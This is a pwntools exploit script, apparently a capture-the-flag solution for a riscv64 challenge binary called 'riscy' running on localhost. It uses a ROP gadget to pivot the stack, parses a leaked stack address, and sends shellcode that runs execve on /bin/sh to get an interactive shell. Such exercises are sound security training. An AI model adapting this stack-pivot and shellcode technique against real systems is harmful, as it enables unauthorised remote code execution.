from pwn import *

context.arch="riscv64"
#p = gdb.debug("./riscy",gdbscript="layout src\nlayout split\nb *main+296")
#p = process("./riscy")
p = remote('127.0.0.1',9006)
#context.terminal = ["tmux", "splitw","-hf"]
GADGET = 0x000000000003da7a
payload = p64(GADGET)
#payload+=p64(0xdeadbeefdeadbeef) * 3
# gadget 0x000000000003d846 : c.ldsp ra, 0x18(sp) ; c.ldsp s0, 0x10(sp) ; c.addi16sp sp, 0x20 ; c.jr ra MUST USE THIS GADGET
# stack pivot
p.send(payload) # gadget
p.recvuntil("at ")
leak = p.recvuntil("\n")
leakaddr = int(leak[:-1],16)
print(leak)
p.clean()
payload = (p64(0xdeadbeefdeadbeef)*2) # padding due to loading return addr from sp + 0x18
payload += p64(leakaddr+32)
shell = asm(shellcraft.riscv64.pushstr("/bin/sh").rstrip()+
pwnlib.shellcraft.riscv64.linux.syscall('SYS_execve', 'sp' , 0, 0, 0).rstrip())
#print(shell)
payload+=shell
p.send(payload)
p.interactive()
